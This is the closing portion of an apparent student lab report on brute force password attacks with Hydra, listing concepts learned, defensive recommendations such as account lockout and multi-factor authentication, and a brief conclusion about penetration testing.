Key Concepts Learned

Understanding brute force attacks

Using Hydra for password cracking

Importance of strong passwords

Identifying weak authentication systems

Security Recommendations

To prevent brute force attacks:

Use strong passwords

Enable account lockout policies

Implement multi-factor authentication

Monitor login attempts

Conclusion

This lab demonstrated how attackers can exploit weak passwords using Hydra. Security professionals can use this tool during penetration testing to identify weak authentication systems and improve security.

Learning tools like Hydra helps us understand both offensive and defensive cybersecurity techniques. 
